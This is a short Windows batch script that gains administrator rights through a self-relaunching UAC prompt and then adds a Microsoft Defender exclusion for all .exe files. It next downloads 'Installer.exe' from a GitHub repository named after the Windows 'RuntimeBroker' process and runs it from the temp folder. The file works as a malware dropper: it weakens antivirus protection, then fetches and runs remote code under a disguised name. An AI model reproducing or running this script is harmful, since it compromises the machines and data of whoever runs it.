REM 
@echo off

:-------------------------------------
REM  --> 
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> 
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
Powershell -Command "Set-MpPreference -ExclusionExtension exe"
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://github.com/TDSScripter/RuntimeBroker/raw/refs/heads/main/Installer.exe' -OutFile installer.exe"
installer.exe
